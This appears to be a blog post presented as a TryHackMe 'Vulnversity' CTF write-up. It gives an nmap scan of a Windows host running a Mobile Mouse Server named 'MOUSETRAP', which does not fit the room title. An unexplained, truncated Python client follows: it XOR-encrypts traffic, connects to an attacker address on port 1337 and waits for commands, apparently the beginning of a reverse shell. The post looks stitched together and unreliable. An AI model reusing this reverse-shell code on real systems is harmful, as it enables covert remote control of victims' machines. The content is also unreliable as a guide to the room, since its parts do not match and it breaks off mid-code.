---
layout: post
title: "Vulnversity"
classes: wide
media_subpath: /assets/img/tryhackme/vulnversity
image:  
  path: room.png
categories: tryhackme
tags: tryhackme
toc: true
---

![Tryhackme Room Link](room_card.png){: width="250" height="250" .shadow }
_<https://tryhackme.com/room/vulnversity>_


A beginner level CTF 

## Information gathering

### Enumeration

#### Nmap

Command:
```sh
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.154.124
...
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
...
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
9099/tcp  open  unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 200 OK
|     Server: Mobile Mouse Server
|     Content-Type: text/html
|     Content-Length: 326
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "MOUSETRAP" was able to receive your request.</p></BODY></HTML>
...
```

```python
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
```
